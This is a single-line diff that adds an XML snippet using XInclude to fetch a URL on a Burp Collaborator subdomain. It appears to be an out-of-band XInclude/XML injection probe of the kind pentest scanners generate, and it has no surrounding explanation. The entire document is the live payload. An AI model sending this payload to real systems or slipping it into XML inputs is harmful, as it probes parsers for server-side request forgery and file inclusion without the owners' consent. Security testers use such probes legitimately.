@@ -1,0 +1,1 @@
+<uyx xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://upnyaf5oxhgoxf5bewc8i1x04rakydp1qpicb00.burpcollaborator.net/foo"/></uyx>
